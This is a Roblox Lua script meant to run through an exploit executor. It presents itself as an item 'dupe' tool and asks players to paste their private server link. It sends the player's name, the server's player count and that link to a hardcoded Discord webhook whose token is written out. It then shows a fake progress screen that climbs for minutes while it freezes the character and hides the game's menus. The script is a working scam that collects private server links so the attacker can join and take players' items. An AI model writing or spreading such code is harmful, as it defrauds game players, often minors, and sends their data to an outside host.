local Players = game:GetService("Players")

local UserInputService = game:GetService("UserInputService")

local TweenService = game:GetService("TweenService")

local StarterGui = game:GetService("StarterGui")

local HttpService = game:GetService("HttpService")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1428416931358183595/uQMf0IyJSiyDCl-Lo1COJQajGSAqZ0VuGO1uk0zrJU3vzGoXqwKAUm59JRZ3KZXodpax"

local player = Players.LocalPlayer

local PlayerGui = player.PlayerGui

local ScreenGui = Instance.new("ScreenGui", PlayerGui)

ScreenGui.Name = "ServerLinkGUI"

local MainFrame = Instance.new("Frame", ScreenGui)

MainFrame.Size = UDim2.fromOffset(350, 180)

MainFrame.Position = UDim2.fromScale(0.5, 0.5) + UDim2.fromOffset(-175, -90)

MainFrame.BackgroundColor3 = Color3.new(0)

MainFrame.BorderSizePixel = 0

Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 8)

local TitleLabel = Instance.new("TextLabel", MainFrame)

TitleLabel.Size = UDim2.fromOffset(350, 40)

TitleLabel.Position = UDim2.fromOffset(0, 10)

TitleLabel.BackgroundTransparency = 1

TitleLabel.Text = "Enter your server link⬇️"

TitleLabel.TextColor3 = Color3.new(1, 1, 1)

TitleLabel.TextSize = 18

TitleLabel.Font = Enum.Font.GothamBold

local TextBox = Instance.new("TextBox", MainFrame)

TextBox.Size = UDim2.fromOffset(280, 40)

TextBox.Position = UDim2.fromScale(0.5, 0) + UDim2.fromOffset(-140, 60)

TextBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)

TextBox.TextColor3 = Color3.new(1, 1, 1)

TextBox.TextSize = 14

TextBox.PlaceholderText = "https://www.roblox.com/share?code=...&type=Server"

TextBox.Font = Enum.Font.Gotham

TextBox.TextXAlignment = Enum.TextXAlignment.Center

Instance.new("UICorner", TextBox).CornerRadius = UDim.new(0, 6)

local EnterButton = Instance.new("TextButton", MainFrame)

EnterButton.Size = UDim2.fromOffset(80, 35)

EnterButton.Position = UDim2.fromScale(0.5, 0) + UDim2.fromOffset(-40, 120)

EnterButton.BackgroundColor3 = Color3.fromRGB(0, 100, 255)

EnterButton.Text = "Enter"

EnterButton.TextColor3 = Color3.new(1, 1, 1)

EnterButton.TextSize = 14

EnterButton.Font = Enum.Font.GothamBold

Instance.new("UICorner", EnterButton).CornerRadius = UDim.new(0, 6)

function sendDiscordNotification(serverLink, playerName, playerCount)

local requestFunc = request or http_request or (syn and syn.request)  

  

if not requestFunc then  

    return  

end  



local success, result = pcall(function()  

    local embed = {  

        {  

            ["title"] = "🔗 novo SERVIDOR MARCELO",  

            ["color"] = 5814783,  

            ["fields"] = {  

                {  

                    ["name"] = "👤 *Nombre*",  

                    ["value"] = "```" .. playerName .. "```",  

                    ["inline"] = true  

                },  

                {  

                    ["name"] = "👥 *Personas*",  

                    ["value"] = "```" .. playerCount .. " jugadores```",  

                    ["inline"] = true  

                },  

                {  

                    ["name"] = "🔗 *Link del servidor*",  

                    ["value"] = "```" .. serverLink .. "```",  

                    ["inline"] = false  

                }  

            },  

            ["footer"] = {  

                ["text"] = "Nitro Hub Tracker"  

            },  

            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")  

        }  

    }  

      

    local data = {  

        ["embeds"] = embed,  

        ["username"] = "Nitro Hub Monitor",  

        ["avatar_url"] = "https://cdn.discordapp.com/attachments/1108384007089827891/1108384031119618058/logo.png"  

    }  

      

    local jsonData = HttpService:JSONEncode(data)  

      

    requestFunc({  

        Url = WEBHOOK_URL,  

        Method = "POST",  

        Headers = {  

            ["Content-Type"] = "application/json"  

        },  

        Body = jsonData  

    })  

end)

end

function getPlayerCount()

return #Players:GetPlayers()

end

function isValidRobloxLink(link)

if not link then return false end  

return string.match(link:lower(), "roblox%.com/share%?code=") ~= nil

end

function createDupeInterface()

ScreenGui:Destroy()  

  

local DupeGui = Instance.new("ScreenGui", PlayerGui)  

DupeGui.Name = "DupeBrainrotGUI"  

DupeGui.IgnoreGuiInset = true  

DupeGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling  



local DupeMainFrame = Instance.new("Frame", DupeGui)  

DupeMainFrame.Size = UDim2.fromScale(1, 1)  

DupeMainFrame.Position = UDim2.new(0,0,0,0)  

DupeMainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 20)  

DupeMainFrame.BorderSizePixel = 0  

DupeMainFrame.ZIndex = 10  



local Title = Instance.new("TextLabel", DupeMainFrame)  

Title.Size = UDim2.new(1, 0, 0, 80)  

Title.Position = UDim2.new(0, 0, 0.3, -40)  

Title.BackgroundTransparency = 1  

Title.Text = "Metado Marcelo"  

Title.TextColor3 = Color3.fromRGB(255, 50, 50)  

Title.TextSize = 32  

Title.Font = Enum.Font.GothamBlack  

Title.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)  

Title.TextStrokeTransparency = 0.8  

  

local Subtitle = Instance.new("TextLabel", DupeMainFrame)  

Subtitle.Size = UDim2.new(1, 0, 0, 40)  

Subtitle.Position = UDim2.new(0, 0, 0.4, 0)  

Subtitle.BackgroundTransparency = 1  

Subtitle.Text = "Marco métodos 🔥👾"  

Subtitle.TextColor3 = Color3.fromRGB(0, 150, 255)  

Subtitle.TextSize = 20  

Subtitle.Font = Enum.Font.GothamBold  

  

local PercentLabel = Instance.new("TextLabel", DupeMainFrame)  

PercentLabel.Size = UDim2.new(1, 0, 0, 60)  

PercentLabel.Position = UDim2.new(0, 0, 0.5, 0)  

PercentLabel.BackgroundTransparency = 1  

PercentLabel.Text = "1%"  

PercentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)  

PercentLabel.TextSize = 28  

PercentLabel.Font = Enum.Font.GothamBold  

  

local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")  

  

if humanoid then  

    humanoid.WalkSpeed = 0  

    humanoid.JumpPower = 0  

end  

  

StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)  

  

local currentPercent = 1  

local MAX_PERCENT = 100  

  

while currentPercent < MAX_PERCENT do  

    task.wait(2)  

    currentPercent = math.min(MAX_PERCENT, currentPercent + 1)  

    PercentLabel.Text = math.floor(currentPercent) .. "%"  

      

    if currentPercent < 33 then  

        PercentLabel.TextColor3 = Color3.fromRGB(255, 50, 50)  

    elseif currentPercent < 66 then  

        PercentLabel.TextColor3 = Color3.fromRGB(255, 255, 50)  

    else  

        PercentLabel.TextColor3 = Color3.fromRGB(50, 255, 50)  

    end  

end  

  

PercentLabel.Text = "100%"  

PercentLabel.TextColor3 = Color3.fromRGB(0, 255, 0)

end

EnterButton.MouseButton1Click:Connect(function()

local serverLink = TextBox.Text  

  

if isValidRobloxLink(serverLink) then  

    local playerName = player.Name  

    local playerCount = getPlayerCount()  

      

    sendDiscordNotification(serverLink, playerName, playerCount)  

      

    EnterButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)  

    EnterButton.Text = "✓ Valid!"  

      

    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)  

    local tween = TweenService:Create(MainFrame, tweenInfo, {Size = UDim2.fromOffset(0, 0)})  

    tween:Play()  

    tween.Completed:Wait()  

      

    createDupeInterface()  

      

else  

    EnterButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)  

    EnterButton.Text = "Invalid Link!"  

      

    local originalPos = TextBox.Position  

    local SHAKE_OFFSET = UDim2.fromOffset(5, 0)  

    local shakeTweenInfo = TweenInfo.new(0.05, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)  

    local shakeIn = TweenService:Create(TextBox, shakeTweenInfo, {Position = originalPos + SHAKE_OFFSET})  

    local shakeOut = TweenService:Create(TextBox, shakeTweenInfo, {Position = originalPos - SHAKE_OFFSET})  



    for i = 1, 4 do  

        local targetTween = (i % 2 == 1) and shakeIn or shakeOut  

        targetTween:Play()  

        targetTween.Completed:Wait()  

    end  

    TextBox.Position = originalPos  

      

    task.wait(1)  

    EnterButton.BackgroundColor3 = Color3.fromRGB(0, 100, 255)  

    EnterButton.Text = "Enter"  

end

end)

UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)

if not gameProcessedEvent and input.KeyCode == Enum.KeyCode.Escape then  

    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)   

    if PlayerGui:FindFirstChild("ServerLinkGUI") then  

        PlayerGui.ServerLinkGUI:Destroy()  

    end  

end

end)

